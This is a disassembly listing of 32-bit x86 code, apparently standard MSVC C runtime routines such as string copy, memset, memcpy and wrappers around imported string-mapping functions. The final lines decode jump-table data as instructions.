  405907:	74 7a                	je     0x405983
  405909:	56                   	push   %esi
  40590a:	53                   	push   %ebx
  40590b:	8b d9                	mov    %ecx,%ebx
  40590d:	8b 74 24 14          	mov    0x14(%esp),%esi
  405911:	f7 c6 03 00 00 00    	test   $0x3,%esi
  405917:	8b 7c 24 10          	mov    0x10(%esp),%edi
  40591b:	75 07                	jne    0x405924
  40591d:	c1 e9 02             	shr    $0x2,%ecx
  405920:	75 6f                	jne    0x405991
  405922:	eb 21                	jmp    0x405945
  405924:	8a 06                	mov    (%esi),%al
  405926:	46                   	inc    %esi
  405927:	88 07                	mov    %al,(%edi)
  405929:	47                   	inc    %edi
  40592a:	49                   	dec    %ecx
  40592b:	74 25                	je     0x405952
  40592d:	84 c0                	test   %al,%al
  40592f:	74 29                	je     0x40595a
  405931:	f7 c6 03 00 00 00    	test   $0x3,%esi
  405937:	75 eb                	jne    0x405924
  405939:	8b d9                	mov    %ecx,%ebx
  40593b:	c1 e9 02             	shr    $0x2,%ecx
  40593e:	75 51                	jne    0x405991
  405940:	83 e3 03             	and    $0x3,%ebx
  405943:	74 0d                	je     0x405952
  405945:	8a 06                	mov    (%esi),%al
  405947:	46                   	inc    %esi
  405948:	88 07                	mov    %al,(%edi)
  40594a:	47                   	inc    %edi
  40594b:	84 c0                	test   %al,%al
  40594d:	74 2f                	je     0x40597e
  40594f:	4b                   	dec    %ebx
  405950:	75 f3                	jne    0x405945
  405952:	8b 44 24 10          	mov    0x10(%esp),%eax
  405956:	5b                   	pop    %ebx
  405957:	5e                   	pop    %esi
  405958:	5f                   	pop    %edi
  405959:	c3                   	ret
  40595a:	f7 c7 03 00 00 00    	test   $0x3,%edi
  405960:	74 12                	je     0x405974
  405962:	88 07                	mov    %al,(%edi)
  405964:	47                   	inc    %edi
  405965:	49                   	dec    %ecx
  405966:	0f 84 8a 00 00 00    	je     0x4059f6
  40596c:	f7 c7 03 00 00 00    	test   $0x3,%edi
  405972:	75 ee                	jne    0x405962
  405974:	8b d9                	mov    %ecx,%ebx
  405976:	c1 e9 02             	shr    $0x2,%ecx
  405979:	75 6c                	jne    0x4059e7
  40597b:	88 07                	mov    %al,(%edi)
  40597d:	47                   	inc    %edi
  40597e:	4b                   	dec    %ebx
  40597f:	75 fa                	jne    0x40597b
  405981:	5b                   	pop    %ebx
  405982:	5e                   	pop    %esi
  405983:	8b 44 24 08          	mov    0x8(%esp),%eax
  405987:	5f                   	pop    %edi
  405988:	c3                   	ret
  405989:	89 17                	mov    %edx,(%edi)
  40598b:	83 c7 04             	add    $0x4,%edi
  40598e:	49                   	dec    %ecx
  40598f:	74 af                	je     0x405940
  405991:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  405996:	8b 06                	mov    (%esi),%eax
  405998:	03 d0                	add    %eax,%edx
  40599a:	83 f0 ff             	xor    $0xffffffff,%eax
  40599d:	33 c2                	xor    %edx,%eax
  40599f:	8b 16                	mov    (%esi),%edx
  4059a1:	83 c6 04             	add    $0x4,%esi
  4059a4:	a9 00 01 01 81       	test   $0x81010100,%eax
  4059a9:	74 de                	je     0x405989
  4059ab:	84 d2                	test   %dl,%dl
  4059ad:	74 2c                	je     0x4059db
  4059af:	84 f6                	test   %dh,%dh
  4059b1:	74 1e                	je     0x4059d1
  4059b3:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  4059b9:	74 0c                	je     0x4059c7
  4059bb:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  4059c1:	75 c6                	jne    0x405989
  4059c3:	89 17                	mov    %edx,(%edi)
  4059c5:	eb 18                	jmp    0x4059df
  4059c7:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  4059cd:	89 17                	mov    %edx,(%edi)
  4059cf:	eb 0e                	jmp    0x4059df
  4059d1:	81 e2 ff 00 00 00    	and    $0xff,%edx
  4059d7:	89 17                	mov    %edx,(%edi)
  4059d9:	eb 04                	jmp    0x4059df
  4059db:	33 d2                	xor    %edx,%edx
  4059dd:	89 17                	mov    %edx,(%edi)
  4059df:	83 c7 04             	add    $0x4,%edi
  4059e2:	33 c0                	xor    %eax,%eax
  4059e4:	49                   	dec    %ecx
  4059e5:	74 0a                	je     0x4059f1
  4059e7:	33 c0                	xor    %eax,%eax
  4059e9:	89 07                	mov    %eax,(%edi)
  4059eb:	83 c7 04             	add    $0x4,%edi
  4059ee:	49                   	dec    %ecx
  4059ef:	75 f8                	jne    0x4059e9
  4059f1:	83 e3 03             	and    $0x3,%ebx
  4059f4:	75 85                	jne    0x40597b
  4059f6:	8b 44 24 10          	mov    0x10(%esp),%eax
  4059fa:	5b                   	pop    %ebx
  4059fb:	5e                   	pop    %esi
  4059fc:	5f                   	pop    %edi
  4059fd:	c3                   	ret
  4059fe:	55                   	push   %ebp
  4059ff:	8b ec                	mov    %esp,%ebp
  405a01:	6a ff                	push   $0xffffffff
  405a03:	68 e0 74 40 00       	push   $0x4074e0
  405a08:	68 d8 42 40 00       	push   $0x4042d8
  405a0d:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405a13:	50                   	push   %eax
  405a14:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405a1b:	83 ec 1c             	sub    $0x1c,%esp
  405a1e:	53                   	push   %ebx
  405a1f:	56                   	push   %esi
  405a20:	57                   	push   %edi
  405a21:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405a24:	33 ff                	xor    %edi,%edi
  405a26:	39 3d 48 99 40 00    	cmp    %edi,0x409948
  405a2c:	75 46                	jne    0x405a74
  405a2e:	57                   	push   %edi
  405a2f:	57                   	push   %edi
  405a30:	6a 01                	push   $0x1
  405a32:	5b                   	pop    %ebx
  405a33:	53                   	push   %ebx
  405a34:	68 d8 74 40 00       	push   $0x4074d8
  405a39:	be 00 01 00 00       	mov    $0x100,%esi
  405a3e:	56                   	push   %esi
  405a3f:	57                   	push   %edi
  405a40:	ff 15 a8 70 40 00    	call   *0x4070a8
  405a46:	85 c0                	test   %eax,%eax
  405a48:	74 08                	je     0x405a52
  405a4a:	89 1d 48 99 40 00    	mov    %ebx,0x409948
  405a50:	eb 22                	jmp    0x405a74
  405a52:	57                   	push   %edi
  405a53:	57                   	push   %edi
  405a54:	53                   	push   %ebx
  405a55:	68 d4 74 40 00       	push   $0x4074d4
  405a5a:	56                   	push   %esi
  405a5b:	57                   	push   %edi
  405a5c:	ff 15 ac 70 40 00    	call   *0x4070ac
  405a62:	85 c0                	test   %eax,%eax
  405a64:	0f 84 22 01 00 00    	je     0x405b8c
  405a6a:	c7 05 48 99 40 00 02 	movl   $0x2,0x409948
  405a71:	00 00 00 
  405a74:	39 7d 14             	cmp    %edi,0x14(%ebp)
  405a77:	7e 10                	jle    0x405a89
  405a79:	ff 75 14             	push   0x14(%ebp)
  405a7c:	ff 75 10             	push   0x10(%ebp)
  405a7f:	e8 9e 01 00 00       	call   0x405c22
  405a84:	59                   	pop    %ecx
  405a85:	59                   	pop    %ecx
  405a86:	89 45 14             	mov    %eax,0x14(%ebp)
  405a89:	a1 48 99 40 00       	mov    0x409948,%eax
  405a8e:	83 f8 02             	cmp    $0x2,%eax
  405a91:	75 1d                	jne    0x405ab0
  405a93:	ff 75 1c             	push   0x1c(%ebp)
  405a96:	ff 75 18             	push   0x18(%ebp)
  405a99:	ff 75 14             	push   0x14(%ebp)
  405a9c:	ff 75 10             	push   0x10(%ebp)
  405a9f:	ff 75 0c             	push   0xc(%ebp)
  405aa2:	ff 75 08             	push   0x8(%ebp)
  405aa5:	ff 15 ac 70 40 00    	call   *0x4070ac
  405aab:	e9 de 00 00 00       	jmp    0x405b8e
  405ab0:	83 f8 01             	cmp    $0x1,%eax
  405ab3:	0f 85 d3 00 00 00    	jne    0x405b8c
  405ab9:	39 7d 20             	cmp    %edi,0x20(%ebp)
  405abc:	75 08                	jne    0x405ac6
  405abe:	a1 40 99 40 00       	mov    0x409940,%eax
  405ac3:	89 45 20             	mov    %eax,0x20(%ebp)
  405ac6:	57                   	push   %edi
  405ac7:	57                   	push   %edi
  405ac8:	ff 75 14             	push   0x14(%ebp)
  405acb:	ff 75 10             	push   0x10(%ebp)
  405ace:	8b 45 24             	mov    0x24(%ebp),%eax
  405ad1:	f7 d8                	neg    %eax
  405ad3:	1b c0                	sbb    %eax,%eax
  405ad5:	83 e0 08             	and    $0x8,%eax
  405ad8:	40                   	inc    %eax
  405ad9:	50                   	push   %eax
  405ada:	ff 75 20             	push   0x20(%ebp)
  405add:	ff 15 4c 70 40 00    	call   *0x40704c
  405ae3:	8b d8                	mov    %eax,%ebx
  405ae5:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  405ae8:	3b df                	cmp    %edi,%ebx
  405aea:	0f 84 9c 00 00 00    	je     0x405b8c
  405af0:	89 7d fc             	mov    %edi,-0x4(%ebp)
  405af3:	8d 04 1b             	lea    (%ebx,%ebx,1),%eax
  405af6:	83 c0 03             	add    $0x3,%eax
  405af9:	24 fc                	and    $0xfc,%al
  405afb:	e8 60 06 00 00       	call   0x406160
  405b00:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405b03:	8b c4                	mov    %esp,%eax
  405b05:	89 45 dc             	mov    %eax,-0x24(%ebp)
  405b08:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405b0c:	eb 13                	jmp    0x405b21
  405b0e:	6a 01                	push   $0x1
  405b10:	58                   	pop    %eax
  405b11:	c3                   	ret
  405b12:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405b15:	33 ff                	xor    %edi,%edi
  405b17:	89 7d dc             	mov    %edi,-0x24(%ebp)
  405b1a:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405b1e:	8b 5d e4             	mov    -0x1c(%ebp),%ebx
  405b21:	39 7d dc             	cmp    %edi,-0x24(%ebp)
  405b24:	74 66                	je     0x405b8c
  405b26:	53                   	push   %ebx
  405b27:	ff 75 dc             	push   -0x24(%ebp)
  405b2a:	ff 75 14             	push   0x14(%ebp)
  405b2d:	ff 75 10             	push   0x10(%ebp)
  405b30:	6a 01                	push   $0x1
  405b32:	ff 75 20             	push   0x20(%ebp)
  405b35:	ff 15 4c 70 40 00    	call   *0x40704c
  405b3b:	85 c0                	test   %eax,%eax
  405b3d:	74 4d                	je     0x405b8c
  405b3f:	57                   	push   %edi
  405b40:	57                   	push   %edi
  405b41:	53                   	push   %ebx
  405b42:	ff 75 dc             	push   -0x24(%ebp)
  405b45:	ff 75 0c             	push   0xc(%ebp)
  405b48:	ff 75 08             	push   0x8(%ebp)
  405b4b:	ff 15 a8 70 40 00    	call   *0x4070a8
  405b51:	8b f0                	mov    %eax,%esi
  405b53:	89 75 d8             	mov    %esi,-0x28(%ebp)
  405b56:	3b f7                	cmp    %edi,%esi
  405b58:	74 32                	je     0x405b8c
  405b5a:	f6 45 0d 04          	testb  $0x4,0xd(%ebp)
  405b5e:	74 40                	je     0x405ba0
  405b60:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  405b63:	0f 84 b2 00 00 00    	je     0x405c1b
  405b69:	3b 75 1c             	cmp    0x1c(%ebp),%esi
  405b6c:	7f 1e                	jg     0x405b8c
  405b6e:	ff 75 1c             	push   0x1c(%ebp)
  405b71:	ff 75 18             	push   0x18(%ebp)
  405b74:	53                   	push   %ebx
  405b75:	ff 75 dc             	push   -0x24(%ebp)
  405b78:	ff 75 0c             	push   0xc(%ebp)
  405b7b:	ff 75 08             	push   0x8(%ebp)
  405b7e:	ff 15 a8 70 40 00    	call   *0x4070a8
  405b84:	85 c0                	test   %eax,%eax
  405b86:	0f 85 8f 00 00 00    	jne    0x405c1b
  405b8c:	33 c0                	xor    %eax,%eax
  405b8e:	8d 65 c8             	lea    -0x38(%ebp),%esp
  405b91:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405b94:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405b9b:	5f                   	pop    %edi
  405b9c:	5e                   	pop    %esi
  405b9d:	5b                   	pop    %ebx
  405b9e:	c9                   	leave
  405b9f:	c3                   	ret
  405ba0:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  405ba7:	8d 04 36             	lea    (%esi,%esi,1),%eax
  405baa:	83 c0 03             	add    $0x3,%eax
  405bad:	24 fc                	and    $0xfc,%al
  405baf:	e8 ac 05 00 00       	call   0x406160
  405bb4:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405bb7:	8b dc                	mov    %esp,%ebx
  405bb9:	89 5d e0             	mov    %ebx,-0x20(%ebp)
  405bbc:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405bc0:	eb 12                	jmp    0x405bd4
  405bc2:	6a 01                	push   $0x1
  405bc4:	58                   	pop    %eax
  405bc5:	c3                   	ret
  405bc6:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405bc9:	33 ff                	xor    %edi,%edi
  405bcb:	33 db                	xor    %ebx,%ebx
  405bcd:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405bd1:	8b 75 d8             	mov    -0x28(%ebp),%esi
  405bd4:	3b df                	cmp    %edi,%ebx
  405bd6:	74 b4                	je     0x405b8c
  405bd8:	56                   	push   %esi
  405bd9:	53                   	push   %ebx
  405bda:	ff 75 e4             	push   -0x1c(%ebp)
  405bdd:	ff 75 dc             	push   -0x24(%ebp)
  405be0:	ff 75 0c             	push   0xc(%ebp)
  405be3:	ff 75 08             	push   0x8(%ebp)
  405be6:	ff 15 a8 70 40 00    	call   *0x4070a8
  405bec:	85 c0                	test   %eax,%eax
  405bee:	74 9c                	je     0x405b8c
  405bf0:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  405bf3:	57                   	push   %edi
  405bf4:	57                   	push   %edi
  405bf5:	75 04                	jne    0x405bfb
  405bf7:	57                   	push   %edi
  405bf8:	57                   	push   %edi
  405bf9:	eb 06                	jmp    0x405c01
  405bfb:	ff 75 1c             	push   0x1c(%ebp)
  405bfe:	ff 75 18             	push   0x18(%ebp)
  405c01:	56                   	push   %esi
  405c02:	53                   	push   %ebx
  405c03:	68 20 02 00 00       	push   $0x220
  405c08:	ff 75 20             	push   0x20(%ebp)
  405c0b:	ff 15 48 70 40 00    	call   *0x407048
  405c11:	8b f0                	mov    %eax,%esi
  405c13:	3b f7                	cmp    %edi,%esi
  405c15:	0f 84 71 ff ff ff    	je     0x405b8c
  405c1b:	8b c6                	mov    %esi,%eax
  405c1d:	e9 6c ff ff ff       	jmp    0x405b8e
  405c22:	8b 54 24 08          	mov    0x8(%esp),%edx
  405c26:	8b 44 24 04          	mov    0x4(%esp),%eax
  405c2a:	85 d2                	test   %edx,%edx
  405c2c:	56                   	push   %esi
  405c2d:	8d 4a ff             	lea    -0x1(%edx),%ecx
  405c30:	74 0d                	je     0x405c3f
  405c32:	80 38 00             	cmpb   $0x0,(%eax)
  405c35:	74 08                	je     0x405c3f
  405c37:	40                   	inc    %eax
  405c38:	8b f1                	mov    %ecx,%esi
  405c3a:	49                   	dec    %ecx
  405c3b:	85 f6                	test   %esi,%esi
  405c3d:	75 f3                	jne    0x405c32
  405c3f:	80 38 00             	cmpb   $0x0,(%eax)
  405c42:	5e                   	pop    %esi
  405c43:	75 05                	jne    0x405c4a
  405c45:	2b 44 24 04          	sub    0x4(%esp),%eax
  405c49:	c3                   	ret
  405c4a:	8b c2                	mov    %edx,%eax
  405c4c:	c3                   	ret
  405c4d:	55                   	push   %ebp
  405c4e:	8b ec                	mov    %esp,%ebp
  405c50:	6a ff                	push   $0xffffffff
  405c52:	68 f8 74 40 00       	push   $0x4074f8
  405c57:	68 d8 42 40 00       	push   $0x4042d8
  405c5c:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  405c62:	50                   	push   %eax
  405c63:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  405c6a:	83 ec 18             	sub    $0x18,%esp
  405c6d:	53                   	push   %ebx
  405c6e:	56                   	push   %esi
  405c6f:	57                   	push   %edi
  405c70:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405c73:	a1 4c 99 40 00       	mov    0x40994c,%eax
  405c78:	33 db                	xor    %ebx,%ebx
  405c7a:	3b c3                	cmp    %ebx,%eax
  405c7c:	75 3e                	jne    0x405cbc
  405c7e:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405c81:	50                   	push   %eax
  405c82:	6a 01                	push   $0x1
  405c84:	5e                   	pop    %esi
  405c85:	56                   	push   %esi
  405c86:	68 d8 74 40 00       	push   $0x4074d8
  405c8b:	56                   	push   %esi
  405c8c:	ff 15 74 70 40 00    	call   *0x407074
  405c92:	85 c0                	test   %eax,%eax
  405c94:	74 04                	je     0x405c9a
  405c96:	8b c6                	mov    %esi,%eax
  405c98:	eb 1d                	jmp    0x405cb7
  405c9a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405c9d:	50                   	push   %eax
  405c9e:	56                   	push   %esi
  405c9f:	68 d4 74 40 00       	push   $0x4074d4
  405ca4:	56                   	push   %esi
  405ca5:	53                   	push   %ebx
  405ca6:	ff 15 78 70 40 00    	call   *0x407078
  405cac:	85 c0                	test   %eax,%eax
  405cae:	0f 84 ce 00 00 00    	je     0x405d82
  405cb4:	6a 02                	push   $0x2
  405cb6:	58                   	pop    %eax
  405cb7:	a3 4c 99 40 00       	mov    %eax,0x40994c
  405cbc:	83 f8 02             	cmp    $0x2,%eax
  405cbf:	75 24                	jne    0x405ce5
  405cc1:	8b 45 1c             	mov    0x1c(%ebp),%eax
  405cc4:	3b c3                	cmp    %ebx,%eax
  405cc6:	75 05                	jne    0x405ccd
  405cc8:	a1 30 99 40 00       	mov    0x409930,%eax
  405ccd:	ff 75 14             	push   0x14(%ebp)
  405cd0:	ff 75 10             	push   0x10(%ebp)
  405cd3:	ff 75 0c             	push   0xc(%ebp)
  405cd6:	ff 75 08             	push   0x8(%ebp)
  405cd9:	50                   	push   %eax
  405cda:	ff 15 78 70 40 00    	call   *0x407078
  405ce0:	e9 9f 00 00 00       	jmp    0x405d84
  405ce5:	83 f8 01             	cmp    $0x1,%eax
  405ce8:	0f 85 94 00 00 00    	jne    0x405d82
  405cee:	39 5d 18             	cmp    %ebx,0x18(%ebp)
  405cf1:	75 08                	jne    0x405cfb
  405cf3:	a1 40 99 40 00       	mov    0x409940,%eax
  405cf8:	89 45 18             	mov    %eax,0x18(%ebp)
  405cfb:	53                   	push   %ebx
  405cfc:	53                   	push   %ebx
  405cfd:	ff 75 10             	push   0x10(%ebp)
  405d00:	ff 75 0c             	push   0xc(%ebp)
  405d03:	8b 45 20             	mov    0x20(%ebp),%eax
  405d06:	f7 d8                	neg    %eax
  405d08:	1b c0                	sbb    %eax,%eax
  405d0a:	83 e0 08             	and    $0x8,%eax
  405d0d:	40                   	inc    %eax
  405d0e:	50                   	push   %eax
  405d0f:	ff 75 18             	push   0x18(%ebp)
  405d12:	ff 15 4c 70 40 00    	call   *0x40704c
  405d18:	89 45 e0             	mov    %eax,-0x20(%ebp)
  405d1b:	3b c3                	cmp    %ebx,%eax
  405d1d:	74 63                	je     0x405d82
  405d1f:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  405d22:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  405d25:	8b c7                	mov    %edi,%eax
  405d27:	83 c0 03             	add    $0x3,%eax
  405d2a:	24 fc                	and    $0xfc,%al
  405d2c:	e8 2f 04 00 00       	call   0x406160
  405d31:	89 65 e8             	mov    %esp,-0x18(%ebp)
  405d34:	8b f4                	mov    %esp,%esi
  405d36:	89 75 dc             	mov    %esi,-0x24(%ebp)
  405d39:	57                   	push   %edi
  405d3a:	53                   	push   %ebx
  405d3b:	56                   	push   %esi
  405d3c:	e8 7f 00 00 00       	call   0x405dc0
  405d41:	83 c4 0c             	add    $0xc,%esp
  405d44:	eb 0b                	jmp    0x405d51
  405d46:	6a 01                	push   $0x1
  405d48:	58                   	pop    %eax
  405d49:	c3                   	ret
  405d4a:	8b 65 e8             	mov    -0x18(%ebp),%esp
  405d4d:	33 db                	xor    %ebx,%ebx
  405d4f:	33 f6                	xor    %esi,%esi
  405d51:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  405d55:	3b f3                	cmp    %ebx,%esi
  405d57:	74 29                	je     0x405d82
  405d59:	ff 75 e0             	push   -0x20(%ebp)
  405d5c:	56                   	push   %esi
  405d5d:	ff 75 10             	push   0x10(%ebp)
  405d60:	ff 75 0c             	push   0xc(%ebp)
  405d63:	6a 01                	push   $0x1
  405d65:	ff 75 18             	push   0x18(%ebp)
  405d68:	ff 15 4c 70 40 00    	call   *0x40704c
  405d6e:	3b c3                	cmp    %ebx,%eax
  405d70:	74 10                	je     0x405d82
  405d72:	ff 75 14             	push   0x14(%ebp)
  405d75:	50                   	push   %eax
  405d76:	56                   	push   %esi
  405d77:	ff 75 08             	push   0x8(%ebp)
  405d7a:	ff 15 74 70 40 00    	call   *0x407074
  405d80:	eb 02                	jmp    0x405d84
  405d82:	33 c0                	xor    %eax,%eax
  405d84:	8d 65 cc             	lea    -0x34(%ebp),%esp
  405d87:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405d8a:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  405d91:	5f                   	pop    %edi
  405d92:	5e                   	pop    %esi
  405d93:	5b                   	pop    %ebx
  405d94:	c9                   	leave
  405d95:	c3                   	ret
  405d96:	a1 54 99 40 00       	mov    0x409954,%eax
  405d9b:	85 c0                	test   %eax,%eax
  405d9d:	74 0f                	je     0x405dae
  405d9f:	ff 74 24 04          	push   0x4(%esp)
  405da3:	ff d0                	call   *%eax
  405da5:	85 c0                	test   %eax,%eax
  405da7:	59                   	pop    %ecx
  405da8:	74 04                	je     0x405dae
  405daa:	6a 01                	push   $0x1
  405dac:	58                   	pop    %eax
  405dad:	c3                   	ret
  405dae:	33 c0                	xor    %eax,%eax
  405db0:	c3                   	ret
  405db1:	cc                   	int3
  405db2:	cc                   	int3
  405db3:	cc                   	int3
  405db4:	cc                   	int3
  405db5:	cc                   	int3
  405db6:	cc                   	int3
  405db7:	cc                   	int3
  405db8:	cc                   	int3
  405db9:	cc                   	int3
  405dba:	cc                   	int3
  405dbb:	cc                   	int3
  405dbc:	cc                   	int3
  405dbd:	cc                   	int3
  405dbe:	cc                   	int3
  405dbf:	cc                   	int3
  405dc0:	8b 54 24 0c          	mov    0xc(%esp),%edx
  405dc4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405dc8:	85 d2                	test   %edx,%edx
  405dca:	74 47                	je     0x405e13
  405dcc:	33 c0                	xor    %eax,%eax
  405dce:	8a 44 24 08          	mov    0x8(%esp),%al
  405dd2:	57                   	push   %edi
  405dd3:	8b f9                	mov    %ecx,%edi
  405dd5:	83 fa 04             	cmp    $0x4,%edx
  405dd8:	72 2d                	jb     0x405e07
  405dda:	f7 d9                	neg    %ecx
  405ddc:	83 e1 03             	and    $0x3,%ecx
  405ddf:	74 08                	je     0x405de9
  405de1:	2b d1                	sub    %ecx,%edx
  405de3:	88 07                	mov    %al,(%edi)
  405de5:	47                   	inc    %edi
  405de6:	49                   	dec    %ecx
  405de7:	75 fa                	jne    0x405de3
  405de9:	8b c8                	mov    %eax,%ecx
  405deb:	c1 e0 08             	shl    $0x8,%eax
  405dee:	03 c1                	add    %ecx,%eax
  405df0:	8b c8                	mov    %eax,%ecx
  405df2:	c1 e0 10             	shl    $0x10,%eax
  405df5:	03 c1                	add    %ecx,%eax
  405df7:	8b ca                	mov    %edx,%ecx
  405df9:	83 e2 03             	and    $0x3,%edx
  405dfc:	c1 e9 02             	shr    $0x2,%ecx
  405dff:	74 06                	je     0x405e07
  405e01:	f3 ab                	rep stos %eax,%es:(%edi)
  405e03:	85 d2                	test   %edx,%edx
  405e05:	74 06                	je     0x405e0d
  405e07:	88 07                	mov    %al,(%edi)
  405e09:	47                   	inc    %edi
  405e0a:	4a                   	dec    %edx
  405e0b:	75 fa                	jne    0x405e07
  405e0d:	8b 44 24 08          	mov    0x8(%esp),%eax
  405e11:	5f                   	pop    %edi
  405e12:	c3                   	ret
  405e13:	8b 44 24 04          	mov    0x4(%esp),%eax
  405e17:	c3                   	ret
  405e18:	cc                   	int3
  405e19:	cc                   	int3
  405e1a:	cc                   	int3
  405e1b:	cc                   	int3
  405e1c:	cc                   	int3
  405e1d:	cc                   	int3
  405e1e:	cc                   	int3
  405e1f:	cc                   	int3
  405e20:	55                   	push   %ebp
  405e21:	8b ec                	mov    %esp,%ebp
  405e23:	57                   	push   %edi
  405e24:	56                   	push   %esi
  405e25:	8b 75 0c             	mov    0xc(%ebp),%esi
  405e28:	8b 4d 10             	mov    0x10(%ebp),%ecx
  405e2b:	8b 7d 08             	mov    0x8(%ebp),%edi
  405e2e:	8b c1                	mov    %ecx,%eax
  405e30:	8b d1                	mov    %ecx,%edx
  405e32:	03 c6                	add    %esi,%eax
  405e34:	3b fe                	cmp    %esi,%edi
  405e36:	76 08                	jbe    0x405e40
  405e38:	3b f8                	cmp    %eax,%edi
  405e3a:	0f 82 78 01 00 00    	jb     0x405fb8
  405e40:	f7 c7 03 00 00 00    	test   $0x3,%edi
  405e46:	75 14                	jne    0x405e5c
  405e48:	c1 e9 02             	shr    $0x2,%ecx
  405e4b:	83 e2 03             	and    $0x3,%edx
  405e4e:	83 f9 08             	cmp    $0x8,%ecx
  405e51:	72 29                	jb     0x405e7c
  405e53:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405e55:	ff 24 95 68 5f 40 00 	jmp    *0x405f68(,%edx,4)
  405e5c:	8b c7                	mov    %edi,%eax
  405e5e:	ba 03 00 00 00       	mov    $0x3,%edx
  405e63:	83 e9 04             	sub    $0x4,%ecx
  405e66:	72 0c                	jb     0x405e74
  405e68:	83 e0 03             	and    $0x3,%eax
  405e6b:	03 c8                	add    %eax,%ecx
  405e6d:	ff 24 85 80 5e 40 00 	jmp    *0x405e80(,%eax,4)
  405e74:	ff 24 8d 78 5f 40 00 	jmp    *0x405f78(,%ecx,4)
  405e7b:	90                   	nop
  405e7c:	ff 24 8d fc 5e 40 00 	jmp    *0x405efc(,%ecx,4)
  405e83:	90                   	nop
  405e84:	90                   	nop
  405e85:	5e                   	pop    %esi
  405e86:	40                   	inc    %eax
  405e87:	00 bc 5e 40 00 e0 5e 	add    %bh,0x5ee00040(%esi,%ebx,2)
  405e8e:	40                   	inc    %eax
  405e8f:	00 23                	add    %ah,(%ebx)
  405e91:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  405e97:	46                   	inc    %esi
  405e98:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  405e9e:	02 c1                	add    %cl,%al
  405ea0:	e9 02 88 47 02       	jmp    0x287e6a7
  405ea5:	83 c6 03             	add    $0x3,%esi
  405ea8:	83 c7 03             	add    $0x3,%edi
  405eab:	83 f9 08             	cmp    $0x8,%ecx
  405eae:	72 cc                	jb     0x405e7c
  405eb0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405eb2:	ff 24 95 68 5f 40 00 	jmp    *0x405f68(,%edx,4)
  405eb9:	8d 49 00             	lea    0x0(%ecx),%ecx
  405ebc:	23 d1                	and    %ecx,%edx
  405ebe:	8a 06                	mov    (%esi),%al
  405ec0:	88 07                	mov    %al,(%edi)
  405ec2:	8a 46 01             	mov    0x1(%esi),%al
  405ec5:	c1 e9 02             	shr    $0x2,%ecx
  405ec8:	88 47 01             	mov    %al,0x1(%edi)
  405ecb:	83 c6 02             	add    $0x2,%esi
  405ece:	83 c7 02             	add    $0x2,%edi
  405ed1:	83 f9 08             	cmp    $0x8,%ecx
  405ed4:	72 a6                	jb     0x405e7c
  405ed6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405ed8:	ff 24 95 68 5f 40 00 	jmp    *0x405f68(,%edx,4)
  405edf:	90                   	nop
  405ee0:	23 d1                	and    %ecx,%edx
  405ee2:	8a 06                	mov    (%esi),%al
  405ee4:	88 07                	mov    %al,(%edi)
  405ee6:	46                   	inc    %esi
  405ee7:	c1 e9 02             	shr    $0x2,%ecx
  405eea:	47                   	inc    %edi
  405eeb:	83 f9 08             	cmp    $0x8,%ecx
  405eee:	72 8c                	jb     0x405e7c
  405ef0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  405ef2:	ff 24 95 68 5f 40 00 	jmp    *0x405f68(,%edx,4)
  405ef9:	8d 49 00             	lea    0x0(%ecx),%ecx
  405efc:	5f                   	pop    %edi
  405efd:	5f                   	pop    %edi
  405efe:	40                   	inc    %eax
  405eff:	00 4c 5f 40          	add    %cl,0x40(%edi,%ebx,2)
  405f03:	00 44 5f 40          	add    %al,0x40(%edi,%ebx,2)
  405f07:	00 3c 5f             	add    %bh,(%edi,%ebx,2)
  405f0a:	40                   	inc    %eax
  405f0b:	00 34 5f             	add    %dh,(%edi,%ebx,2)
  405f0e:	40                   	inc    %eax
  405f0f:	00 2c 5f             	add    %ch,(%edi,%ebx,2)
  405f12:	40                   	inc    %eax
  405f13:	00 24 5f             	add    %ah,(%edi,%ebx,2)
  405f16:	40                   	inc    %eax
  405f17:	00 1c 5f             	add    %bl,(%edi,%ebx,2)
  405f1a:	40                   	inc    %eax
  405f1b:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  405f21:	44                   	inc    %esp
  405f22:	8f                   	(bad)
  405f23:	e4 8b                	in     $0x8b,%al
  405f25:	44                   	inc    %esp
  405f26:	8e e8                	mov    %eax,%gs
  405f28:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  405f2c:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
